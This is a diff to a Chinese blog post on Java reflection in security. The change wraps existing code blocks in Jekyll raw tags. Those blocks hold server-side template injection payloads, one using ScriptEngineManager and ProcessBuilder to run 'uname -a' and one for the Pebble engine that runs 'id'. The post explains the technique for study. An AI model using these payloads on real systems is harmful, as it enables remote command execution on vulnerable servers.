@@ -129,6 +129,7 @@ ex.waitFor()
    这款模板引擎的payload直接就能看出是用Java的反射机制，都是先获取的`javax.script.ScriptEngineManager`类对象，然后`newInstance()`实例化，在之后创建一个`JavaScript`引擎最后执行命令。  
 ![在这里插入图片描述](./pic/从安全角度谈Java反射机制-终章/20200430101257182.png)
 
+{% raw %}
 ```bash
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
 
@@ -138,6 +139,7 @@ ex.waitFor()
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
+{% endraw %}
 
 ---
 
@@ -146,6 +148,7 @@ ex.waitFor()
    Pebble是一个受Twig启发的java模板化引擎。它以其继承功能和易读的语法从人群中脱颖而出。它内置了安全的自动缩放功能，并且包含了对国际化的集成支持。更多内容查看[官方GitHub地址](https://github.com/PebbleTemplates/pebble)，[官方文档](https://pebbletemplates.io/wiki/guide/basic-usage/)。  
 payload：
 
+{% raw %}
 ```java
 {% set cmd = 'id' %}
 {% set bytes = (1).TYPE
@@ -160,6 +163,7 @@ payload：
      .constructors[0]
      .newInstance(([bytes]).toArray()) }}
 ```
+{% endraw %}
 
 ---
 
